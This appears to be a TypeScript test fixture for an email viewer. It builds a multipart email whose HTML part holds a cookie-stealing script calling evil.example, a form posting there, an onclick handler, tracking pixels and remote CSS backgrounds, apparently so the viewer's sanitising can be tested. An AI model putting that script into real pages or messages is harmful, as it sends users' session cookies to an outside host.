/**
 * A marketing-shaped email for the viewer's tests: an HTML part with a
 * script, a tracking pixel, a sized remote logo, a remote CSS background, a
 * form, a web link and a `mailto:`, plus one inline `cid:` chart.
 */

/** A 1×1 PNG: the inline chart's bytes. */
export const CHART_PNG =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='

export const TRACKER = 'https://track.example/open.gif?u=42'

export const HTML_PART = `<html><head><style>.hero{background:url(https://track.example/bg.png)}</style></head><body>
<p class="hero">Q3 closed ahead of plan.</p>
<img src="cid:chart@acme" alt="Occupancy by city">
<img src="${TRACKER}" width="1" height="1">
<img src="https://cdn.acme.example/logo.png" width="120" height="32" alt="Acme">
<script>fetch('https://evil.example/' + document.cookie)</script>
<a href="https://acme.example/deck">the deck</a>
<a href="mailto:jane@acme-robotics.example">Jane</a>
<form action="https://evil.example/f"><input name="x"></form>
<p onclick="alert(1)" style="background-image:url(https://track.example/p.png)">Best, Jane</p>
</body></html>`

export function htmlEmail(over: {
  messageId: string
  to: string
  date?: string
}): string {
  return [
    'From: Jane Founder <jane@acme-robotics.example>',
    `To: ${over.to}`,
    'Cc: Acme CFO <cfo@acme-robotics.example>',
    'Subject: Acme Robotics — Q3 update',
    `Date: ${over.date ?? new Date(Date.now() - 10 * 60_000).toUTCString()}`,
    `Message-ID: <${over.messageId}>`,
    'MIME-Version: 1.0',
    'Content-Type: multipart/related; boundary="rel"',
    '',
    '--rel',
    'Content-Type: multipart/alternative; boundary="alt"',
    '',
    '--alt',
    'Content-Type: text/plain; charset="UTF-8"',
    '',
    'Q3 closed ahead of plan. Best, Jane',
    '',
    '--alt',
    'Content-Type: text/html; charset="UTF-8"',
    '',
    HTML_PART,
    '',
    '--alt--',
    '',
    '--rel',
    'Content-Type: image/png',
    'Content-Transfer-Encoding: base64',
    'Content-ID: <chart@acme>',
    'Content-Disposition: inline; filename="chart.png"',
    '',
    CHART_PNG,
    '',
    '--rel--',
    '',
  ].join('\r\n')
}
